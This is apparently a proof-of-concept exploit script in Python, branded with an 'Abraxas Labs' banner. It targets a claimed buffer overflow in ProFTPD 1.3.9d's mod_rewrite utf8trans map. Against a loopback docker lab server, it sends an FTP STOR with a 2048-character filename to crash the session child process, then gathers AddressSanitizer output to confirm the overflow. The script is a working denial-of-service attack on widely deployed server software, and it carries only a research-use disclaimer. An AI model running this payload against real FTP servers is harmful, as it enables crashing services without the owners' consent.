#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: proftpd-rewrite-utf8trans (High: 7.5)
#  Vendor: ProFTPD (proftpd.org)
#  Versions: ProFTPD 1.3.9d contrib mod_rewrite
#  Impact: RewriteMap int:utf8trans overflows 1024-slot BSS and crashes the session child
#  Requires: RewriteEngine on; int:utf8trans map; loopback lab; ASan build
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "proftpd-rewrite-utf8trans"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ProFTPD 1.3.9d mod_rewrite int:utf8trans BSS overflow (crash/ASan WRITE)."""

import ftplib
import io
import os
import socket
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "PROFTPD-REWRITE-UTF8TRANS"
WITNESS = "PROFTPD-REWRITE-UTF8TRANS-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "proftpd-rewrite-utf8trans")
HERE = Path(__file__).resolve().parent

FTP_HOST = "127.0.0.1"
FTP_PORT = 18740
FTP_USER = "labuser"
FTP_PASS = "labpass"
CONTROL_LEN = 200
TRIGGER_LEN = 2048
TIMEOUT_S = 12.0
ASAN_NEEDLES = (
    "addresssanitizer",
    "global-buffer-overflow",
    "heap-buffer-overflow",
    "stack-buffer-overflow",
    "write of size",
)


@dataclass(frozen=True)
class FtpAttempt:
    name: str
    ok: bool
    reset: bool
    timeout: bool
    code: int | None
    error: str
    detail: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} reason={reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 400) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def ftp_login() -> ftplib.FTP:
    ftp = ftplib.FTP()
    ftp.connect(FTP_HOST, FTP_PORT, timeout=TIMEOUT_S)
    ftp.login(FTP_USER, FTP_PASS)
    ftp.set_pasv(True)
    ftp.sock.settimeout(TIMEOUT_S)
    return ftp


def _is_reset(exc: BaseException) -> bool:
    if isinstance(exc, (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, EOFError)):
        return True
    text = str(exc).lower()
    tokens = (
        "reset",
        "broken pipe",
        "connection abort",
        "timed out",
        "421",
        "eof",
        "closed",
    )
    return any(tok in text for tok in tokens)


def stor(ftp: ftplib.FTP, name: str, body: bytes) -> str:
    ftp.storbinary(f"STOR {name}", io.BytesIO(body))
    return "stor-ok"


def attempt_stor(label: str, name: str, body: bytes) -> FtpAttempt:
    ftp: ftplib.FTP | None = None
    try:
        ftp = ftp_login()
        detail = stor(ftp, name, body)
        try:
            noop = ftp.voidcmd("NOOP")
        except (ftplib.error_reply, ftplib.error_perm, ftplib.error_temp) as exc:
            noop = str(exc)
        log(f"{label} stor=ok name_len={len(name)} noop={clip(noop, 120)}")
        return FtpAttempt(label, True, False, False, 226, "", detail)
    except socket.timeout as exc:
        log(f"{label} timeout={exc!r} name_len={len(name)}")
        return FtpAttempt(label, False, False, True, None, str(exc), "timeout")
    except TimeoutError as exc:
        log(f"{label} timeout={exc!r} name_len={len(name)}")
        return FtpAttempt(label, False, False, True, None, str(exc), "timeout")
    except ftplib.error_temp as exc:
        text = str(exc)
        reset = _is_reset(exc) or text.startswith("421")
        log(f"{label} error_temp={clip(text, 160)} reset={int(reset)} name_len={len(name)}")
        return FtpAttempt(label, False, reset, False, 421 if text.startswith("421") else None, text, "error_temp")
    except (ftplib.error_perm, ftplib.error_reply, ftplib.error_proto) as exc:
        text = str(exc)
        log(f"{label} ftp-error={clip(text, 160)} name_len={len(name)}")
        return FtpAttempt(label, False, _is_reset(exc), False, None, text, "ftp-error")
    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError, EOFError, OSError) as exc:
        reset = _is_reset(exc)
        log(f"{label} conn={exc!r} reset={int(reset)} name_len={len(name)}")
        return FtpAttempt(label, False, reset, False, None, str(exc), "conn")
    finally:
        if ftp is not None:
            try:
                ftp.close()
            except (OSError, EOFError, ftplib.all_errors):
                pass


def daemon_alive() -> bool:
    try:
        with ftp_login() as ftp:
            pwd = ftp.pwd()
            log(f"post-trigger login pwd={pwd!r}")
            return True
    except (OSError, EOFError, socket.timeout, TimeoutError, ftplib.all_errors) as exc:
        log(f"post-trigger login failed: {exc!r}")
        return False


def collect_evidence() -> str:
    chunks: list[str] = []
    logs = compose("logs", "--no-color", "--tail", "400", timeout=30)
    chunks.append((logs.stdout or "") + (logs.stderr or ""))
    files = compose(
        "exec",
        "-T",
        "proftpd",
        "sh",
        "-c",
        "cat /tmp/asan* /home/labuser/tmp/asan* 2>/dev/null || true",
        timeout=30,
    )
    chunks.append(files.stdout or "")
    chunks.append(files.stderr or "")
    return "\n".join(chunks)


def asan_kind(blob: str) -> tuple[str, bool]:
    low = blob.lower()
    write = "write of size" in low or "write of size" in blob.lower()
    if "global-buffer-overflow" in low:
        return "global-buffer-overflow", write or True
    if "heap-buffer-overflow" in low:
        return "heap-buffer-overflow", write
    if "stack-buffer-overflow" in low:
        return "stack-buffer-overflow", write
    if "addresssanitizer" in low:
        return "addresssanitizer", write
    return "no", write


def ioc_lines(blob: str) -> None:
    for line in blob.splitlines():
        low = line.lower()
        if any(tok in low for tok in ASAN_NEEDLES + ("asan abort", "sigsegv", "aborting", "deadly signal")):
            log(f"IOC {clip(line.strip(), 300)}")


def child_dead(trigger: FtpAttempt, asan: str) -> bool:
    if asan != "no":
        return True
    if trigger.reset:
        return True
    if trigger.timeout:
        return True
    if trigger.code == 421:
        return True
    return False


def main() -> int:
    log(f"label={LABEL} ftp={FTP_HOST}:{FTP_PORT} user={FTP_USER}")
    log(f"control_len={CONTROL_LEN} trigger_len={TRIGGER_LEN}")

    banner = compose("logs", "--no-color", "--tail", "40", "proftpd", timeout=20)
    banner_text = (banner.stdout or "") + (banner.stderr or "")
    if "1.3.9d" in banner_text:
        log("banner pin=1.3.9d")
    else:
        log(f"banner {clip(banner_text, 240)}")

    control_name = "c" + ("A" * (CONTROL_LEN - 1))
    trigger_name = "A" * TRIGGER_LEN

    log("== control STOR short ASCII ==")
    control = attempt_stor("control", control_name, b"control-body\n")
    if not control.ok:
        evidence = collect_evidence()
        ioc_lines(evidence)
        return fail("control-stor-failed")

    log("== trigger STOR utf8trans map key ==")
    trigger = attempt_stor("trigger", trigger_name, b"trigger-body\n")
    time.sleep(1.0)
    evidence = collect_evidence()
    ioc_lines(evidence)
    kind, write = asan_kind(evidence)
    dead = child_dead(trigger, kind)
    log(
        f"trigger ok={int(trigger.ok)} reset={int(trigger.reset)} "
        f"timeout={int(trigger.timeout)} asan={kind} write={int(write)} child-dead={int(dead)}"
    )

    if trigger.ok:
        return fail("trigger-stor-survived")
    if not dead:
        return fail("trigger-no-child-death")

    alive = daemon_alive()
    log(f"control-alive={int(alive)}")

    if kind != "no":
        write_tok = "yes" if write or kind == "global-buffer-overflow" else "no"
        log(
            f"SUCCESS {LABEL} asan={kind} write={write_tok} "
            f"child-dead=yes {WITNESS}"
        )
        return 0

    if not alive:
        return fail("asan-no-and-daemon-dead")
    log(
        f"SUCCESS {LABEL} asan=no child-dead=yes control-alive=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

